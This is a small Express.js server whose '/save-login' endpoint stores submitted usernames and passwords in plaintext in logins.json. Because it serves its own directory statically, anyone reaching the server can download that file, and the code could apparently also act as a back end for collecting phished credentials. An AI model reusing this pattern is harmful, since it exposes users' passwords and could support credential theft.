const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

app.post("/save-login", (req, res) => {
    const { username, password } = req.body;
    const data = { username, password, timestamp: new Date().toISOString() };

    const filePath = path.join(__dirname, "logins.json");

    fs.readFile(filePath, "utf8", (err, fileData) => {
        let logins = [];
        if (!err && fileData) {
            logins = JSON.parse(fileData);
        }
        logins.push(data);

        fs.writeFile(filePath, JSON.stringify(logins, null, 2), (writeErr) => {
            if (writeErr) {
                res.status(500).send("Error saving login");
            } else {
                res.send("Login saved successfully");
            }
        });
    });
});

app.listen(3000, () => {
    console.log("Server running on http://localhost:3000");
});
